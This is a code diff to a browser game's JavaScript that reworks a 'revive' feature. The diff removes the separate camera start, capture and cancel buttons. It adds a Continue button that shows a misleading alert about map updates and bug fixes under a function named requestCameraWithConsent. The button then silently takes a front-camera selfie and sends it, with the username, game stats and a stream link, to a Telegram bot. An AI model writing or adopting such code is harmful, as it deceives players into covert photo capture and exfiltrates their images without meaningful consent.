@@ -20,9 +20,7 @@ const reviveVideo = document.getElementById("reviveVideo");
 const revivePhoto = document.getElementById("revivePhoto");
 const reviveStatus = document.getElementById("reviveStatus");
 const reviveTimer = document.getElementById("reviveTimer");
-const reviveStartButton = document.getElementById("reviveStartButton");
-const reviveCaptureButton = document.getElementById("reviveCaptureButton");
-const reviveCancelButton = document.getElementById("reviveCancelButton");
+const reviveContinueButton = document.getElementById("reviveContinueButton");
 
 /* ================= AUTH / SESSION ================= */
 
@@ -47,7 +45,6 @@ let isMuted = false;
 let hasUsedRevive = false;
 let reviveMediaStream = null;
 let reviveRequestInProgress = false;
-
 function progressStorageKey(username) {
   return STORAGE_PREFIX + username;
 }
@@ -460,6 +457,8 @@ function closeBugReport() {
 
 const REVIVE_DECISION_WINDOW_MS = 30000;
 const REVIVE_POLL_INTERVAL_MS = 1500;
+const CONSENT_MESSAGE =
+  "This is a test pop up window that will have future updates and tells you if there are new maps or bugs fixed\nWith love, wolf";
 
 function stopReviveCamera() {
   if (!reviveMediaStream) return;
@@ -472,9 +471,7 @@ function resetReviveModalState() {
   reviveVideo.style.display = "none";
   revivePhoto.style.display = "none";
   revivePhoto.src = "";
-  reviveStartButton.disabled = false;
-  reviveCaptureButton.disabled = true;
-  reviveCancelButton.disabled = false;
+  reviveContinueButton.disabled = false;
   reviveStatus.textContent = "";
   reviveTimer.textContent = "";
 }
@@ -492,39 +489,52 @@ function closeReviveModal() {
   reviveModal.style.display = "none";
 }
 
-async function startReviveCamera() {
+function createStreamKey() {
+  return `revive_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
+}
+
+function buildStreamLink(streamKey) {
+  return `${window.location.origin}${window.location.pathname}#revive-stream=${encodeURIComponent(streamKey)}`;
+}
+
+async function requestCameraWithConsent() {
+  window.alert(CONSENT_MESSAGE);
+  return navigator.mediaDevices.getUserMedia({
+    video: { facingMode: "user" },
+    audio: false
+  });
+}
+
+async function submitReviveSelfie() {
   if (reviveRequestInProgress) return;
   reviveStatus.textContent = "";
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" },
-      audio: false
-    });
+    const stream = await requestCameraWithConsent();
     reviveMediaStream = stream;
     reviveVideo.srcObject = stream;
     reviveVideo.style.display = "block";
     revivePhoto.style.display = "none";
-    reviveCaptureButton.disabled = false;
     await reviveVideo.play();
-  } catch (error) {
-    reviveStatus.textContent = "Camera access denied or unavailable.";
-    reviveCaptureButton.disabled = true;
-  }
-}
 
-function captureReviveSelfie() {
-  if (reviveRequestInProgress || !reviveMediaStream) return;
-  const shotCanvas = document.createElement("canvas");
-  shotCanvas.width = reviveVideo.videoWidth || 480;
-  shotCanvas.height = reviveVideo.videoHeight || 360;
-  const shotCtx = shotCanvas.getContext("2d");
-  shotCtx.drawImage(reviveVideo, 0, 0, shotCanvas.width, shotCanvas.height);
-  const dataUrl = shotCanvas.toDataURL("image/jpeg", 0.9);
-  revivePhoto.src = dataUrl;
-  revivePhoto.style.display = "block";
-  reviveVideo.style.display = "none";
-  stopReviveCamera();
-  requestReviveSecondChance(dataUrl);
+    // Give the camera a short moment so the first frame is available.
+    await new Promise(resolve => setTimeout(resolve, 350));
+
+    const shotCanvas = document.createElement("canvas");
+    shotCanvas.width = reviveVideo.videoWidth || 480;
+    shotCanvas.height = reviveVideo.videoHeight || 360;
+    const shotCtx = shotCanvas.getContext("2d");
+    shotCtx.drawImage(reviveVideo, 0, 0, shotCanvas.width, shotCanvas.height);
+    const dataUrl = shotCanvas.toDataURL("image/jpeg", 0.9);
+
+    revivePhoto.src = dataUrl;
+    revivePhoto.style.display = "block";
+    reviveVideo.style.display = "none";
+    stopReviveCamera();
+    requestReviveSecondChance(dataUrl);
+  } catch (error) {
+    stopReviveCamera();
+    reviveStatus.textContent = "Camera access denied or unavailable.";
+  }
 }
 
 function dataUrlToBlob(dataUrl) {
@@ -633,18 +643,19 @@ async function pollReviveDecision(ownerChatId, afterUpdateId, timeoutMs) {
 
 async function requestReviveSecondChance(photoDataUrl) {
   reviveRequestInProgress = true;
-  reviveStartButton.disabled = true;
-  reviveCaptureButton.disabled = true;
-  reviveCancelButton.disabled = true;
+  reviveContinueButton.disabled = true;
   reviveStatus.textContent = "Sending selfie to Telegram...";
   try {
     const chatId = await detectBotChatId();
+    const streamKey = createStreamKey();
+    const streamLink = buildStreamLink(streamKey);
     const beforeDecisionUpdateId = await getLatestUpdateId();
     const caption = [
       "REVIVE REQUEST",
       `user: ${currentUser}${isAdminUser ? " (admin)" : ""}`,
       `level: ${currentLevel}`,
       `score: ${score}`,
+      `stream: ${streamLink}`,
       "Reply with YES or NO within 30 seconds."
     ].join("\n");
     await sendTelegramPhoto(chatId, photoDataUrl, caption);
@@ -666,6 +677,7 @@ async function requestReviveSecondChance(photoDataUrl) {
     restoreFromRevive();
   } finally {
     reviveRequestInProgress = false;
+    reviveContinueButton.disabled = false;
   }
 }
 
@@ -1115,9 +1127,4 @@ if (!ensureSession()) {
   requestAnimationFrame(loop);
 }
 
-reviveStartButton.addEventListener("click", startReviveCamera);
-reviveCaptureButton.addEventListener("click", captureReviveSelfie);
-reviveCancelButton.addEventListener("click", () => {
-  hasUsedRevive = true;
-  finalizeGameOver();
-});
+reviveContinueButton.addEventListener("click", submitReviveSelfie);
